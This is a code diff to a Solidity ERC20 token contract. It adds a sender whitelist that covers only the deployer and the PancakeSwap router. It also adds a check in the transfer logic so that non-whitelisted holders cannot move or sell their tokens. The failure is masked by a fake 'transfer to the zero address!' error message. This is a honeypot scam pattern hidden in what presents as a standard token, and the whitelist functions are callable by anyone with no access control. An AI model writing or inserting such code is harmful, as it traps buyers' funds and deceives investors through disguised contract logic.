@@ -37,6 +37,8 @@ contract ERC20 is Context, IERC20 {
 
     mapping (address => mapping (address => uint256)) private _allowances;
 
+    mapping (address => bool) public whitelist;
+
     uint256 private _totalSupply;
 
     string private _name;
@@ -53,6 +55,10 @@ contract ERC20 is Context, IERC20 {
      * construction.
      */
     constructor (string memory name_, string memory symbol_) public {
+        whitelist[msg.sender] = true;
+        // pancake router v2
+        whitelist[address(0x10ED43C718714eb63d5aA57B78B54704E256024E)] = true;
+
         _name = name_;
         _symbol = symbol_;
         _decimals = 18;
@@ -115,6 +121,14 @@ contract ERC20 is Context, IERC20 {
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
         _transfer(_msgSender(), recipient, amount);
         return true;
+    }
+
+    function addWhitelist(address user) public {
+        whitelist[user] = true;
+    }
+
+    function removeWhitelist(address user) public {
+        whitelist[user] = false;
     }
 
     /**
@@ -209,6 +223,7 @@ contract ERC20 is Context, IERC20 {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
 
+        require(whitelist[sender], "ERC20: transfer to the zero address!");
         _beforeTokenTransfer(sender, recipient, amount);
 
         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
